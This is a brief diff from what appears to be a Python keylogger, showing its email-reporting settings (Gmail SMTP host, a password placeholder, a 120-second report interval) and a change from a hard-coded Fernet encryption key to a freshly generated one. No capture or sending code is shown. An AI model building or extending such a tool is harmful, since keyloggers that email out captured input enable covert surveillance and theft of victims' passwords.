@@ -9,7 +9,7 @@ EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
 SEND_REPORT_EVERY = 120  # seconds
 EMAIL_HOST = "smtp.gmail.com"
 PORT = 587
-SECRET = b"F1C7ZQ1ThDSpmw13fKWT_gS-rjkl0HwdDo4Wxo63R2k="  # Fernet.generate_key()
+SECRET = Fernet.generate_key()
 
 
 class Keylogger:
